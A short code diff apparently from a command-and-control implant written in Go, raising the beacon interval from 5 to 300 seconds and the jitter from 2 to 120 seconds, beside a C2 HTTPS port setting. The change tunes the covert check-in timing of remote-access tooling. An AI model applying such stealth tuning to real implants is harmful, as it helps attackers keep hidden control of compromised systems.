@@ -59,11 +59,11 @@ var (
 
 	// BeaconInterval is the base time between A record check-ins (seconds).
 	// Default: 300 (5 minutes)
-	BeaconInterval = 5
+	BeaconInterval = 300
 
 	// Jitter is the ± randomization applied to BeaconInterval (seconds).
 	// Default: 60 (results in 4-6 minute range)
-	Jitter = 2
+	Jitter = 120
 
 	// HTTPSPort is the port for direct HTTPS connection to C2.
 	HTTPSPort = 8443
